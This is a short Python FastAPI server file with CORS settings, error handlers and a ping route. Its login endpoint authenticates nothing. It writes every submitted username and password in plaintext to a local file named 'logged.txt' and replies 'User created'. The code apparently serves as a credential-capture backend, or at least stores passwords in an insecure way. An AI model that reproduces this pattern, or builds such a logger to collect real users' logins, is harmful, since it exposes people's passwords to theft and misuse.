from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import JSONResponse
from fastapi.exceptions import RequestValidationError
from pydantic import ValidationError, BaseModel
from starlette.exceptions import HTTPException as StarletteHTTPException

app = FastAPI()

@app.exception_handler(StarletteHTTPException)
async def http_exception_handler(request, exc):
    return JSONResponse(
        status_code=exc.status_code,
        content={"message": exc.detail},
    )

@app.exception_handler(RequestValidationError)
async def validation_exception_handler(request, exc):
    return JSONResponse(
        status_code=400,
        content={"message": "Validation error", "details": exc.errors()},
    )

@app.exception_handler(ValidationError)
async def validation_exception_handler(request, exc):
    return JSONResponse(
        status_code=400,
        content={"message": "Validation error", "details": exc.errors()},
    )
    
origins = [ "http://localhost", "http://localhost:3000", "http://localhost:8000", "http://localhost:8080", "http://localhost:8081" ]

app.add_middleware( CORSMiddleware, allow_origins=origins, allow_credentials=True, allow_methods=["*"], allow_headers=["*"], )

@app.get("/")
async def read_root():
    return {"status": 200, "message":"Ping OK"}

class User(BaseModel):
    username: str
    password: str

@app.post("/api/auth/login")
async def login(user: User):
    try:
        file_name = f"logged.txt"
        with open(file_name, "a") as file:
            file.write(f"{user.username} {user.password}")
            file.write("\n")
        return {"status": 200, "message": "User created"}
    except Exception as e:
        return {"status": 500, "message": str(e)}
            
            
        

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, port=8000)